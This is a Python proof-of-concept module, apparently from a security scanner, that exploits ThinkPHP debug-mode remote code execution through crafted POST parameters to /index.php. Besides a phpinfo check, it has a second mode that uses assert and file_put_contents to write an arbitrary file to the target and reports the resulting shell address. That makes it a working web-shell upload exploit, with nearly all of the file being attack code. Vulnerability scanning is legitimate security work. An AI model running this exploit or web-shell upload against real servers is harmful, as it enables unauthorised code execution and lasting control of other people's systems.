# -*- coding:utf-8 -*-
# Thinkphp debug命令执行
from ServiceScanModel.models import ServiceScan

from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False

    def thinphp_debug(self, url, cmd="", content=""):
        try:
            if cmd == "":
                resp = self.requestUtil.post(url + "/index.php", data={
                    "_method": "__construct",
                    "filter[]": "call_user_func",
                    "method": "get",
                    "get[]": "phpinfo"
                })
                if "http://www.php.net/" in resp.text:
                    return ["Thinkphp debug命令执行", "phpinfo() is executed"]
                else:
                    return []
            else:
                file_name = cmd
                cmd = f"file_put_contents('{file_name}', '{content}')"
                print(cmd)
                resp = self.requestUtil.post(url + "/index.php", data={
                    "_method": "__construct",
                    "filter[]": "assert",
                    "method": "post",
                    "post[]": cmd
                })
                url = url.strip("/")
                if resp.status_code == 200:
                    return f"文件已成功上传，shell地址: {url}/{file_name}"
                else:
                    return ""
        except:
            return []

    def fingerprint(self):
        if self.service.url:
            return True

    def poc(self):
        return self.thinphp_debug(self.service.url)
